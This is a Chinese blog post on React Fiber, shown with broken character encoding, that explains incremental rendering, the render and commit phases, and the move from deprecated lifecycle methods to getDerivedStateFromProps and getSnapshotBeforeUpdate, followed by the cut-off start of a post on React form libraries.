å‡è¨­ä½ ç¾åœ¨æœ‰ä¸€å€‹è¶…ç´šå¤šåŠŸèƒ½çš„ Appï¼Œæœ‰è‘—è¶…ç´šå¤šçš„ Componentï¼Œç„¶å¾Œä½ æ”¹è®Šäº†æœ€ä¸Šå±¤çš„ Componentï¼ˆå‡è¨­å®ƒå«&lt;App /&gt;ï¼‰ çš„ stateã€‚
å› ç‚º state è®Šäº†ï¼Œæ‰€ä»¥å°±æœƒä¾†åŸ·è¡Œé€™å€‹&lt;App /&gt;çš„ render functionï¼Œç„¶å¾ŒåŸ·è¡ŒAppåº•ä¸‹çš„ component çš„ render functionï¼Œå°±é€™æ¨£ä¸€ç›´å¾€ä¸‹åŸ·è¡Œä¸‹å»ï¼Œç›´åˆ°ç¢°åˆ°æœ€åº•å±¤ç‚ºæ­¢ã€‚
ä½ å¦‚æœå»çœ‹ call stackï¼Œå°±æœƒç™¼ç¾é€™å€‹ call stack è¶…å¤§ä¸€å€‹ï¼š

ï¼ˆåœ–ç‰‡ä¾†æºï¼šReact Fiberç¾çŠ¶ç¢ºèªï¼‰
é€™æ¨£æœƒé€ æˆä»€éº¼å•é¡Œå‘¢ï¼Ÿå› ç‚ºä½ çš„ call stack å¤ªæ·±è€Œä¸”æ±è¥¿å¤ªå¤šï¼Œå†åŠ ä¸Šé€™å€‹éç¨‹åˆæ˜¯ä¸èƒ½è¢«ä¸­æ–·çš„ï¼Œæœƒå°è‡´ main thread è¢« block ä½ï¼Œåœ¨é€™æ™‚é–“ä¹‹å…§ä½ åšä»»ä½•äº‹æƒ…ï¼Œç€è¦½å™¨éƒ½ä¸æœƒæœ‰åæ‡‰ã€‚
ç°¡å–®ä¾†èªªå‘¢ï¼Œå°±æ˜¯å› ç‚ºè¦åšçš„äº‹å¤ªå¤šï¼Œæ‰€ä»¥ main thread å°±æœƒ block ä½äº†ï¼Œé€™å°±æ˜¯ React åœ¨æ•ˆèƒ½ä¸Šæœƒç¢°åˆ°çš„ä¸€å€‹å•é¡Œã€‚
åˆ°é€™é‚Šï¼Œæˆ‘å€‘å·²ç¶“å›ç­”ç¬¬ä¸€å€‹å•é¡Œäº†ï¼ŒFiber å°±æ˜¯ç‚ºäº†è§£æ±ºé€™å€‹å•é¡Œè€Œç”¢ç”Ÿçš„è§£æ³•ã€‚æ¥è‘—æˆ‘å€‘ä¾†å›ç­”ç¬¬äºŒå€‹å•é¡Œï¼šè§£æ±ºæ–¹æ³•æ˜¯ä»€éº¼ï¼Ÿ

æ—¢ç„¶å•é¡Œçš„æˆå› æ˜¯ï¼šã€Œè¦åšçš„äº‹æƒ…å¤ªå¤šåˆä¸èƒ½ä¸­æ–·ã€ï¼Œé‚£æˆ‘å€‘åªè¦ç™¼æ˜ä¸€å€‹ã€Œå¯ä»¥ä¸­æ–·ã€çš„æ©Ÿåˆ¶å°±å¥½å•¦ï¼ä¸è¦ä¸€æ¬¡å…¨éƒ¨æ›´æ–°ï¼Œè€Œæ˜¯å¢é‡æ›´æ–°ï¼ˆincremental renderingï¼‰ï¼Œå°±å¯ä»¥è§£æ±ºé€™å€‹å•é¡Œäº†ï¼

æ¯”èµ·åŸæœ¬çš„ä¸€æ¬¡æ€§æ›´æ–°ï¼Œå‡å¦‚æˆ‘å€‘èƒ½å¤ æŠŠè¦æ›´æ–°çš„å·¥ä½œåˆ‡æˆä¸€å€‹å€‹å°çš„å·¥ä½œï¼Œæ¯æ¬¡åªåŸ·è¡Œä¸€å€‹å°å·¥ä½œï¼Œé‚£é€™æ¨£ main thread å°±ä¸æœƒè¢« block ä½äº†ï¼Œå› ç‚ºæ¯å€‹å°å·¥ä½œä¹‹é–“éƒ½å¯ä»¥æœ‰ç©ºæª”å»åšåˆ¥çš„äº‹æƒ…ï¼ˆéŸ¿æ‡‰ä½¿ç”¨è€…çš„é»æ“Šã€ç¹ªè£½æ–°çš„ç•«é¢ç­‰ç­‰ï¼‰ã€‚
å°±åƒä¸‹é¢é€™å¼µç¤ºæ„åœ–ä¸€æ¨£ï¼Œæ¯æ¬¡å®Œæˆä¸€é»é»çš„å·¥ä½œï¼Œè€Œä¸æ˜¯ä¸€æ¬¡å®Œæˆå…¨éƒ¨çš„ï¼š

ï¼ˆåœ–ç‰‡ä¾†æºï¼šLin Clark - A Cartoon Intro to Fiber - React Conf 2017
ï¼‰
å¥½äº†ï¼Œä½ å·²ç¶“çŸ¥é“ä»€éº¼æ˜¯ Fiber äº†ï¼Œé€™å°±æ˜¯ Fiberã€‚æ¯ä¸€å€‹å°å·¥ä½œå°±å«åš Fiberï¼Œè€Œ Fiber åœ¨è‹±æ–‡è£¡é¢æ˜¯çº–ç¶­çš„æ„æ€ï¼Œæ‰€ä»¥åˆæœ‰äººæŠŠé€™å€‹æ©Ÿåˆ¶ç¨±ä½œã€Œçº–ç¨‹ã€ã€‚
æˆ–æ˜¯æ›å€‹è§’åº¦æƒ³ï¼ŒåŸæœ¬çš„å•é¡Œæ˜¯å› ç‚ºç¨‹å¼è£¡é¢é€™æ¨£å­ä¸€å±¤å±¤åŸ·è¡Œ render function çš„æ–¹æ³•æ˜¯é€é call stackï¼Œæ¯æ¬¡ call ä¸€å€‹ function å°±æŠŠä¸€å€‹æ–°çš„ä»»å‹™ä¸Ÿåˆ° stack frame å»ï¼Œå¯æ˜¯é€™æ¨£å­çš„æ©Ÿåˆ¶æœƒå°è‡´ä»»å‹™ç„¡æ³•ä¸­æ–·ã€‚
æ–¼æ˜¯ Fiber å°±å¯¦ä½œå‡ºäº† virtual stack frameï¼Œç°¡å–®ä¾†èªªå°±æ˜¯è‡ªå·±ç”¨ js å†æ¨¡æ“¬å‡ºä¸€å€‹ call stack çš„æ„Ÿè¦ºï¼Œä½†å¥½è™•å°±æ˜¯è‡ªå·±æœ‰å®Œå…¨çš„æŒæ§æ¬Šï¼Œè€Œä¸æ˜¯è¢« js çš„é‹è¡Œæ©Ÿåˆ¶çµ¦ç¶ä½ã€‚
å†å¹«å¤§å®¶é‡æ–°æ•´ç†ä¸€æ¬¡ï¼Œæ²’æœ‰ Fiber ä¹‹å‰ï¼Œä½ è¦æ›´æ–°çš„æ™‚å€™éƒ½æ˜¯ã€Œä¸€æ¬¡æ€§ã€çš„æ›´æ–°ï¼Œä¸­é–“ç„¡æ³•ä¸­æ–·ï¼Œå°è‡´ main thread åœ¨é€™æœŸé–“æœƒè¢« block ä½ã€‚
æœ‰äº† Fiber é€™å€‹æ©Ÿåˆ¶ä¹‹å¾Œï¼Œæˆ‘å€‘æŠŠä¸€å€‹å¤§æ›´æ–°åˆ‡æˆå¾ˆå¤šå¡Šå°çš„æ›´æ–°ï¼Œæ¯æ¬¡åªæ›´æ–°ä¸€é»é»ï¼Œé€™æ¨£å­åœ¨æ›´æ–°çš„ç©ºæª” main thread å°±èƒ½å»åšå…¶ä»–äº‹æƒ…ï¼Œè€Œä¸æœƒè¢«ç¶ä½ã€‚
è½èµ·ä¾†ååˆ†ç¾å¥½ï¼Œå•é¡Œè¿åˆƒè€Œè§£ï¼Œå¯æ˜¯å‰¯ä½œç”¨æ˜¯ä»€éº¼å‘¢ï¼Ÿ
Fiber æ‰€å¸¶ä¾†çš„æ”¹è®ŠæŠŠæ ¸å¿ƒæ›æˆ Fiber ä¹‹å¾Œï¼Œæ˜¯è¦ä»˜å‡ºä¸€äº›ä»£åƒ¹çš„ã€‚åœ¨ Fiber è£¡é¢çš„å·¥ä½œå…¶å¯¦åˆ†æˆå…©å€‹éšæ®µï¼š

render&#x2F;reconciliation
commit

ç°¡å–®ä¾†èªªå‘¢ï¼Œç¬¬ä¸€éšæ®µå°±æ˜¯æ‰¾å‡ºéœ€è¦æ”¹è®Šçš„éƒ¨åˆ†ï¼Œè€Œç¬¬äºŒéšæ®µæ˜¯çœŸæ­£çš„æŠŠé€™äº›æ”¹è®Šæ‡‰ç”¨åˆ° DOM ä¸Šé¢å»ã€‚ç¬¬ä¸€éšæ®µæ˜¯å¯ä»¥è¢«ä¸­æ–·ï¼Œä¹Ÿå¯ä»¥è¢«é‡æ–°åŸ·è¡Œçš„ï¼Œè€Œç¬¬äºŒéšæ®µè·Ÿä»¥å‰ä¸€æ¨£ï¼Œå¿…é ˆä¸€å£æ°£åšå®Œã€‚
è€Œé€™å…©å€‹éšæ®µä¹Ÿå°æ‡‰åˆ°ä¸åŒçš„ç”Ÿå‘½é€±æœŸï¼š
ç¬¬ä¸€éšæ®µ
componentWillMount
componentWillReceiveProps
shouldComponentUpdate
componentWillUpdate

ç¬¬äºŒéšæ®µ
componentDidMount
componentDidUpdate
componentWillUnmount

å› ç‚ºç¬¬ä¸€éšæ®µæ˜¯å¯ä»¥ä¸­æ–·ä¸¦ä¸”ä¹‹å¾Œå†é‡æ–°åŸ·è¡Œçš„ï¼Œæ‰€ä»¥æœƒå°è‡´åœ¨ç¬¬ä¸€éšæ®µè£¡çš„é€™äº›å‡½æ•¸ï¼Œæœ‰å¯èƒ½è¢« call å¾ˆå¤šæ¬¡ã€‚

ï¼ˆåœ–ç‰‡ä¾†æºï¼šLin Clark - A Cartoon Intro to Fiber - React Conf 2017
ï¼‰
æ‰€ä»¥ï¼Œå‡è¨­ä½ ä¹‹å‰ç¿’æ…£åœ¨componentWillMountè£¡é¢å°±å‘¼å« API æ‹¿è³‡æ–™çš„è©±ï¼Œå°±æœƒå°è‡´ä½  call äº†ä¸åªä¸€æ¬¡çš„ APIï¼Œæœƒæµªè²»ä¸€äº›é »å¯¬ï¼Œè¦æ”¹è®Šçš„è©±å°±è¦æŠŠé€™äº› code ç§»åˆ°componentDidMountå»ï¼Œå°±åªæœƒä¿è­‰è¢« call ä¸€æ¬¡è€Œå·²ã€‚
ç¸½ä¹‹å‘¢ï¼Œè‡ªå¾å…§éƒ¨æ©Ÿåˆ¶æ”¹æˆ Fiber ä¹‹å¾Œï¼ˆå¾ React 16 é–‹å§‹ï¼Œæ‰€ä»¥å¦‚æœä½ æ˜¯ç”¨ 16 ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œå·²ç¶“æ˜¯ Fiber äº†ï¼‰ï¼ŒReact çš„ç”Ÿå‘½é€±æœŸå‡½æ•¸è¢«å‘¼å«çš„æ¬¡æ•¸è·Ÿæ–¹å¼æœƒè·Ÿä»¥å‰ä¸å¤ªä¸€æ¨£ã€‚
é™¤æ­¤ä¹‹å¤–å°±æ˜¯æˆ‘é–‹é ­æçš„é‚£å€‹é †åºçš„ä¸ä¸€æ¨£ï¼Œé€™é»ä¹Ÿæ˜¯å€¼å¾—æ³¨æ„çš„ä¸€å€‹éƒ¨åˆ†ã€‚é›–ç„¶çœ‹èµ·ä¾†ä¸æ˜¯ä»€éº¼å¤§å•é¡Œï¼Œä½†å¦‚æœä¸çŸ¥é“é€™é»çš„è©±å¯èƒ½æœƒç”Ÿå‡ºä¸€äº›è«åå…¶å¦™çš„ Bugã€‚
React çš„æœªä¾†React 16.3 åœ¨æ˜¨å¤©æ­£å¼ç™¼ä½ˆäº†ï¼Œä¼´éš¨è€Œä¾†çš„æ˜¯æ­£å¼çš„ context API ä»¥åŠ lifecycle çš„æ”¹è®Šã€‚
éš¨è‘— Fiber çš„æ­£å¼ä¸Šç·šï¼Œæœªä¾†å¯ä»¥æœŸå¾…æœƒæœ‰æ›´å¤šä»¤äººèˆˆå¥®çš„æ–°åŠŸèƒ½ã€‚æ¯”å¦‚èªªåœ¨Sneak Peek: Beyond React 16é€™ç¯‡æåˆ°çš„time slicingï¼ŒæŠŠæ•´å€‹ App çš„é«”é©—è®Šå¾—æ›´é †æš¢ã€‚
è€ŒUpdate on Async Renderingé€™ç¯‡æ–‡ç« ä¹Ÿæåˆ°äº†éåŒæ­¥æ¸²æŸ“çš„é€²å±•ã€‚
è‡ªå¾å…§éƒ¨çš„æ©Ÿåˆ¶æ”¹æˆ Fiber ä¹‹å¾Œï¼Œå°±è®“ async rendering å¾—ä»¥ç™¼æ®æœ€å¤§çš„æ•ˆèƒ½ã€‚
ä½†ç‚ºäº† async renderingï¼Œæ˜¯éœ€è¦ä»˜å‡ºä¸€äº›ä»£åƒ¹çš„ã€‚åŸæœ¬çš„ lifecycle API åœ¨é€™ç¨®å ´æ™¯åº•ä¸‹å¯èƒ½æœƒæœ‰ä¸€äº›å•é¡Œï¼Œå®˜æ–¹æœ‰çµ¦å‡ºè¨±å¤šå¸¸è¦‹çš„ä¾‹å­ï¼Œä¹ŸåŒ…å«æˆ‘å€‘ä¸Šé¢æ‰€èªªåˆ°çš„ï¼ŒcomponentWillMountæœƒè¢«å‘¼å«å¤šæ¬¡çš„å•é¡Œï¼š
ï¼ˆå¿½ç•¥åŸæœ¬çš„ç¯„ä¾‹ç¨‹å¼ç¢¼ï¼Œä½†å¤§æ„å°±æ˜¯åœ¨componentWillMountè£¡é¢ call APIï¼‰

The above code is problematic for both server rendering (where the external data wonâ€™t be used) and the upcoming async rendering mode (where the request might be initiated multiple times).


The recommended upgrade path for most use cases is to move data-fetching into componentDidMount

å°æ–¼ async renderingï¼Œæœƒå¼•èµ·å•é¡Œçš„æ˜¯ä»¥ä¸‹ä¸‰å€‹ç”Ÿå‘½é€±æœŸï¼š

componentWillMount
componentWillReceiveProps
componentWillUpdate

é€™ä¸‰å€‹ lifecycle æœƒåœ¨ React 17 è£¡é¢è¢«æ‹¿æ‰ï¼ˆå¦‚æœä½ é‚„æ˜¯æƒ³ç”¨çš„è©±å¯ä»¥åŠ ä¸ŠUNSAFE_ï¼Œä¾‹å¦‚èªªæ”¹æˆUNSAFE_componentWillMountå°±ä¸€æ¨£å¯ä»¥ç”¨ï¼‰ï¼Œä½†æ—¢ç„¶éƒ½èªªæ˜¯ UNSAFE äº†ï¼Œæ²’æœ‰ç†ç”±ç¹¼çºŒä½¿ç”¨ä¸‹å»ã€‚
èˆŠçš„ä¸å»æ–°çš„ä¸ä¾†ï¼Œåœ¨æœ€æ–°ç™¼ä½ˆçš„ 16.3 ä¸­ï¼Œå¼•å…¥äº†å…©å€‹æ–°çš„ lifecycle ä¾†è§£æ±ºä¸Šé¢çš„é‚£äº›å•é¡Œï¼š

getDerivedStateFromProps
getSnapshotBeforeUpdate

ç¬¬ä¸€å€‹å¾ˆé¡¯ç„¶æ˜¯è¦ä¾†å–ä»£componentWillReceivePropsçš„ï¼Œè€Œç¬¬äºŒå€‹æ˜¯æ‹¿ä¾†å–ä»£componentWillUpdateçš„ã€‚æˆ–å…¶å¯¦æœ‰äº›å ´æ™¯åº•ä¸‹ï¼Œç”¨componentDidUpdateä¹Ÿå¯ä»¥å–ä»£åŸæœ¬é‚£å…©å€‹ç”Ÿå‘½é€±æœŸã€‚
è‡³æ–¼æœ€å‰é¢æ‰€æåˆ°çš„componentWillMountï¼Œå‰‡å»ºè­°æŠŠè£¡é¢çš„ç¨‹å¼ç¢¼æ¬åˆ°componentDidMountå»ã€‚
æ¥è‘—è®“æˆ‘å€‘å¿«é€Ÿä¾†çœ‹ä¸€ä¸‹æ–°çš„ç”Ÿå‘½é€±æœŸå¦‚ä½•æ›¿ä»£èˆŠçš„ï¼Œä»¥ä¸‹æˆ‘å°±ç›´æ¥ä½¿ç”¨å®˜æ–¹çµ¦çš„ç¯„ä¾‹äº†ã€‚é€™å€‹ç¯„ä¾‹æœƒåµæ¸¬ props ä¾†æ±ºå®šè¦ä¸è¦æ”¹è®Š stateï¼Œæ˜¯å¾ˆå¸¸è¦‹çš„æ‡‰ç”¨å ´æ™¯ï¼š
// Beforeclass ExampleComponent extends React.Component &#123;  state = &#123;    isScrollingDown: false,  &#125;;    componentWillReceiveProps(nextProps) &#123;    if (this.props.currentRow !== nextProps.currentRow) &#123;      this.setState(&#123;        isScrollingDown:          nextProps.currentRow &gt; this.props.currentRow,      &#125;);    &#125;  &#125;&#125;

è€Œæ–°çš„ç”Ÿå‘½é€±æœŸstatic getDerivedStateFromPropsï¼Œæœƒåœ¨ component è¢«å»ºç«‹é‚„æœ‰æ”¶åˆ°æ–°çš„ props çš„æ™‚å€™è¢«å‘¼å«ï¼Œä½†åªæœƒå‚³å…¥æ–°çš„ props è·ŸèˆŠçš„ stateï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥é€™æ¨£æ”¹ï¼š
// Afterclass ExampleComponent extends React.Component &#123;  // åˆå§‹åŒ– state  state = &#123;    isScrollingDown: false,    lastRow: null,  &#125;;    static getDerivedStateFromProps(nextProps, prevState) &#123;    // æŠŠæ–°çš„ props è·ŸèˆŠçš„ state åšæ¯”è¼ƒ    if (nextProps.currentRow !== prevState.lastRow) &#123;      // å›å‚³æ–°çš„ state      return &#123;        isScrollingDown: nextProps.currentRow &gt; prevState.lastRow,        lastRow: nextProps.currentRow, // åŒæ­¥ä¸€ä¸‹ state      &#125;;    &#125;      // return null ä»£è¡¨ä¸ç”¨æ”¹è®Š state    return null;  &#125;&#125;

å…¶å¯¦èªªç©¿äº†å°±åªæ˜¯ä½ è‡ªå·±æŠŠä»¥å‰componentWillReceivePropsæœƒå‚³ä¾†çš„prevPropså­˜åˆ° state è£¡é¢ï¼Œæ”¹æˆè·Ÿ state ä¾†æ¯”è¼ƒè€Œå·²ã€‚
çœ‹åˆ°é€™é‚Šä½ å¯èƒ½æœƒå¾ˆç–‘æƒ‘ï¼šã€Œé‚£ç‚ºä»€éº¼ getDerivedStateFromProps ä¸ç›´æ¥æŠŠ prevProps å‚³é€²ä¾†å°±å¥½ï¼Ÿã€
React å®˜æ–¹çµ¦çš„ç†ç”±æœ‰å…©å€‹ï¼š

å› ç‚º getDerivedStateFromProps åœ¨åˆå§‹åŒ–çš„æ™‚å€™ä¹Ÿæœƒè¢« callï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡çš„ prevProps æœƒæ˜¯ nullï¼Œä»£è¡¨ä½ æ¯æ¬¡éƒ½è¦åšä¸€æ¬¡ null checkï¼Œé€™æ¨£ä¸å¥½
ä¸å‚³ prevProps å°±ä»£è¡¨ React ä¸ç”¨å¹«ä½ è¨˜ä½ prevProps äº†ï¼Œå°æœªä¾†åœ¨è¨˜æ†¶é«”ä¸Šé¢çš„å„ªåŒ–æœ‰å¹«åŠ©

ç¸½ä¹‹å‘¢ï¼Œä»¥å¾Œå°±ä¸æœƒæœ‰componentWillReceivePropså¯ä»¥ç”¨äº†ï¼Œä½ è¦è‡ªå·±æŠŠéœ€è¦çš„prevPropsä¿å­˜åœ¨ state è£¡é¢ï¼Œä¸¦ä¸”åœ¨getDerivedStateFromPropsè£¡é¢é€²è¡Œæ¯”è¼ƒã€‚
å†çœ‹å¦å¤–ä¸€å€‹ä¾‹å­ï¼Œé€™å€‹ä¾‹å­çš„ç›®çš„æ˜¯è¦åœ¨æ–°å¢ item çš„æ™‚å€™ç¶­æŒæ²è»¸çš„ä½ç½®ï¼Œæ‰€ä»¥å¿…é ˆåœ¨ update ä¹‹å‰ä¿å­˜èˆŠçš„é«˜åº¦ï¼Œåœ¨ update ä¹‹å¾Œå»èª¿æ•´æ²è»¸çš„ä½ç½®ï¼š
class ScrollingList extends React.Component &#123;  listRef = null;  previousScrollHeight = null;    componentWillUpdate(nextProps, nextState) &#123;    // æœ‰æ–°å¢ item çš„è©±ï¼Œè¨˜ä½ç¾åœ¨çš„é«˜åº¦    if (this.props.list.length &lt; nextProps.list.length) &#123;      this.previousScrollHeight = this.listRef.scrollHeight;    &#125;  &#125;    componentDidUpdate(prevProps, prevState) &#123;    // å¦‚æœ previousScrollHeight ä¸æ˜¯ nullï¼Œä»£è¡¨æœ‰æ–°å¢ item    // èª¿æ•´æ²è»¸ä½ç½®    if (this.previousScrollHeight !== null) &#123;      this.listRef.scrollTop += this.listRef.scrollHeight - this.previousScrollHeight;      this.previousScrollHeight = null;    &#125;  &#125;    render() &#123;    return (      &lt;div ref=&#123;this.setListRef&#125;&gt;        &#123;/* ...contents... */&#125;      &lt;/div&gt;    );  &#125;    setListRef = ref =&gt; &#123;    this.listRef = ref;  &#125;;&#125;

é‚£é€™æ¨£å­æœƒå¸¶ä¾†çš„å•é¡Œæ˜¯ä»€éº¼å‘¢ï¼Ÿé‚„è¨˜å¾—æˆ‘å€‘å‰é¢æœ‰æé Fiber æœ‰å…©å€‹éšæ®µå—ï¼Ÿrender è·Ÿ commitã€‚é€™å…©å€‹éšæ®µæœƒæœ‰æ™‚é–“å·®ï¼Œè€ŒcomponentWillUpdateæ˜¯è™•æ–¼ç¬¬ä¸€å€‹éšæ®µï¼ŒcomponentDidUpdateæ˜¯å±¬æ–¼ç¬¬äºŒå€‹éšæ®µã€‚
å‡å¦‚ä½¿ç”¨è€…åœ¨é€™å…©å€‹éšæ®µä¹‹é–“åšäº†ä¸€äº›äº‹æƒ…ï¼Œä¾‹å¦‚èªªèª¿æ•´è¦–çª—çš„å°ºå¯¸ï¼Œé‚£ä½ å­˜çš„é«˜åº¦å°±ä¸æœƒæ˜¯æ­£ç¢ºçš„äº†ï¼Œè€Œæ˜¯æœƒæ‹¿åˆ°èˆŠçš„å€¼ã€‚
è§£æ±ºæ–¹æ³•å°±æ˜¯åˆ©ç”¨æ–°çš„ç”Ÿå‘½é€±æœŸgetSnapshotBeforeUpdateï¼Œé€™å€‹æœƒåœ¨ DOM è¢«æ›´æ–°ä¹‹å‰å‘¼å«ï¼Œå¯ä»¥ä¿è­‰ä½ æ‹¿åˆ°çš„æ±è¥¿ä¸€å®šæ˜¯æœ€æ–°çš„ã€‚
class ScrollingList extends React.Component &#123;  listRef = null;    getSnapshotBeforeUpdate(prevProps, prevState) &#123;    // å¦‚æœ list æœ‰è®Šå‹•ï¼Œå°±å›å‚³ç¾åœ¨çš„æ²è»¸é«˜åº¦    // é€™å€‹å›å‚³å€¼æœƒè¢«ç•¶ä½œ componentDidUpdate çš„ç¬¬ä¸‰å€‹åƒæ•¸    if (prevProps.list.length &lt; this.props.list.length) &#123;      return this.listRef.scrollHeight;    &#125;    return null;  &#125;    componentDidUpdate(prevProps, prevState, snapshot) &#123;    // snapshot å°±æ˜¯ä¸Šé¢å›å‚³çš„é‚£å€‹å€¼    // å¦‚æœä¸æ˜¯ nullï¼Œå°±åˆ©ç”¨ snapshot ä¾†èª¿æ•´æ²è»¸é«˜åº¦    if (snapshot !== null) &#123;      this.listRef.scrollTop +=        this.listRef.scrollHeight - snapshot;    &#125;  &#125;    render() &#123;    return (      &lt;div ref=&#123;this.setListRef&#125;&gt;        &#123;/* ...contents... */&#125;      &lt;/div&gt;    );  &#125;    setListRef = ref =&gt; &#123;    this.listRef = ref;  &#125;;&#125;

ç¸½ä¹‹å‘¢ï¼Œçµåˆæ­é…ä½¿ç”¨ commit phase çš„ lifecycleï¼ˆcomponentDidMountã€componentDidUpdateã€componentWillUnmount ï¼‰ä»¥åŠæ–°å¼•é€²çš„getDerivedStateFromPropsèˆ‡getSnapshotBeforeUpdate ï¼Œå°±å¯ä»¥å–ä»£æ‰èˆŠçš„é‚£äº›æœ‰å¯èƒ½æœƒé€ æˆå•é¡Œçš„ lifecycleã€‚
å¦‚æœæƒ³è¦çœ‹æ›´å¤šç¯„ä¾‹çš„è©±ï¼Œé€™ç¯‡å¾ˆå€¼å¾—åƒè€ƒï¼šUpdate on Async Renderingã€‚
çµè«–æ•ˆèƒ½ä¸€ç›´æ˜¯ Web App å¾ˆæ³¨é‡çš„ä¸€å€‹é»ï¼Œè€Œéœ€è¦æŠŠæ¡çš„åŸå‰‡å°±åªæœ‰ä¸€å€‹ï¼šä¸è¦ block main threadã€‚åªè¦ main thread å¯ä»¥åšäº‹ï¼Œå®ƒå°±å¯ä»¥å»è™•ç†å…¶ä»–äº‹æƒ…ï¼Œä¾‹å¦‚èªªéŸ¿æ‡‰ä½¿ç”¨è€…çš„ click æˆ–æ˜¯ç¹ªè£½æ–°çš„ç•«é¢ç­‰ç­‰ã€‚
è€Œ React åŸæœ¬çš„æ©Ÿåˆ¶æœƒé€ æˆå•é¡Œï¼Œå› æ­¤å°‡å…§éƒ¨æ ¸å¿ƒç”¨ Fiber æ”¹å¯«ï¼ŒæŠŠä¸€å¤§å€‹ä¸å¯ä¸­æ–·çš„ä»»å‹™åˆ‡å‰²æˆè¨±å¤šå°çš„ã€å¯ä»¥ä¸­æ–·çš„å·¥ä½œï¼Œè€Œå¯ä»¥åˆ‡å‰²ä¹‹å¾Œä¹Ÿä½¿å¾—ä»¥å¾Œæœ‰å¹³è¡ŒåŒ–çš„å¯èƒ½ï¼Œrender çš„é€Ÿåº¦å¯èƒ½åˆæœƒæ›´å¿«ä¸€é»ã€‚
ä½†ä¹Ÿå› ç‚ºé€™æ¨£æ©Ÿåˆ¶çš„æ”¹è®Šï¼Œå½±éŸ¿åˆ°åŸæœ¬çš„ç”Ÿå‘½é€±æœŸï¼Œä¸€å€‹ä¸å°å¿ƒå°±æœƒå‡ºç‹€æ³ï¼Œè€Œå®˜æ–¹ä¹Ÿç™¼å¸ƒäº†æ–°çš„å…©å€‹ç”Ÿå‘½é€±æœŸä¾†è§£æ±ºé€™å€‹å•é¡Œã€‚
èº«ç‚º React é•·æœŸçš„ä½¿ç”¨è€…ï¼Œå°é€™ç¨®å¤§çš„æ”¹è®Šé›–ç„¶è¦ºå¾—è¦æ”¹ code å¾ˆç…©ï¼Œä½†é•·æœŸä¾†çœ‹å…¶å¯¦æ˜¯åˆ©å¤šï¼Œç•¢ç«Ÿå¯ä»¥åšçš„äº‹æƒ…åˆæ›´å¤šäº†ï¼Œæ•ˆèƒ½ä¹Ÿæœƒæ„ˆä¾†æ„ˆå¥½ã€‚
é€™ç¯‡ç¸½çµäº†è¿‘æœŸæˆ‘ç ”ç©¶ Fiber è·Ÿé—œæ³¨ React æ–°çš„è®ŠåŒ–çš„ä¸€äº›å¿ƒå¾—ï¼ŒFiber åº•å±¤çš„å¯¦ä½œæ©Ÿåˆ¶å› ç‚ºæˆ‘ä¹Ÿä¸æ˜¯å¾ˆç†è§£ï¼Œæ‰€ä»¥ä¸æ•¢å‡ºä¾†ç­é–€å¼„æ–§ï¼Œåªå¸Œæœ›èƒ½é€éç™½è©±æ–‡è®“å¤§å®¶ç†è§£é€™å€‹æ©Ÿåˆ¶å¤§æ¦‚æ˜¯é•·æ€æ¨£ã€‚
å¦‚æœæœ‰å“ªé‚Šæœ‰è¬›éŒ¯ï¼Œé‚„éº»ç…©ä¸åæŒ‡æ­£ï¼Œæ„Ÿè¬ã€‚
åƒè€ƒè³‡æ–™ï¼š

React Fiber Architecture
What is React Fiber ?
Reactä¸­state renderåˆ°html domçš„æµç¨‹åˆ†æ
å®Œå…¨ç†è§£React Fiber
[ç¿»è­¯] React Fiber ç¾ç‹€ç¢ºèª
React v16.3.0: New lifecycles and context API
React Docs - Scheduling
æµ…è°ˆReact 16ä¸­çš„Fiberæœºåˆ¶
Lin Clark - A Cartoon Intro to Fiber - React Conf 2017

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>react,fiber,react lifecycle</tag>
      </tags>
  </entry>
  <entry>
    <title>React Form: Redux Form vs React Final Form vs Formik and Yup</title>
    <url>/2019/05/03/react-form/</url>
    <content><![CDATA[
æœ¬æ–‡æœƒå…ˆå¾ç‚ºä½•è¦åšè¡¨å–®ç‹€æ…‹ç®¡ç†èªªèµ·ï¼Œæ¥è‘—çœ‹ç›®å‰å¸‚é¢ä¸Šæœ‰å“ªäº›å¥½çš„è¡¨å–®å‡½å¼åº«å’Œæ¢åˆ—æŒ‘é¸åŸå‰‡ï¼Œä¸¦æ¢è¨ä¸‰å€‹è¡¨å–®å‡½å¼åº« Redux Formã€React Final Formã€Formik &amp; Yupï¼Œæœ€å¾Œåšæ¯”è¼ƒå’Œç¸½çµã€‚
ç‚ºä½•éœ€è¦åšè¡¨å–®ç‹€æ…‹ç®¡ç†ï¼Ÿç‚ºä»€éº¼éœ€è¦åšè¡¨å–®ç‹€æ…‹ç®¡ç†å‘¢ï¼Ÿé€™å°±è¦å¾ controlled component å’Œ uncontrolled component é–‹å§‹è«‡èµ·ã€‚
åœ¨ä¸€èˆ¬ HTML çš„ä¸–ç•Œè£¡é¢ï¼Œè¡¨å–®çš„ç‹€æ…‹æ˜¯ç”±å…ƒä»¶æœ¬èº«ä¾†åšå„²å­˜å’Œæ›´æ–°çš„ï¼Œç¨±ä¹‹ç‚ºã€Œuncontrolled componentã€ï¼›è€Œåœ¨ React çš„ä¸–ç•Œè£¡ï¼Œè¡¨å–®çš„ç‹€æ…‹å’Œå€¼çš„æ›´æ–°æ˜¯ç”±é–‹ç™¼è€…è™•ç†ï¼Œå¦‚ä¸‹åœ–æ‰€ç¤ºï¼Œè¡¨å–®æ¬„ä½çš„å€¼å¯å¾ props æˆ– state å–å¾—ï¼Œåœ¨é€™è£¡æ˜¯ stateï¼Œä¸¦ä¸”ç•¶ä½¿ç”¨è€…æ‰“å­—ç­‰è¡Œç‚ºæ™‚è§¸ç™¼äº‹ä»¶ä¾†åšå€¼çš„æ›´æ–°ï¼Œåœ¨é€™è£¡æ˜¯è§¸ç™¼ onChange äº‹ä»¶ï¼Œé€™æ¨£çš„å…ƒä»¶ç¨±ç‚ºã€Œcontrolled 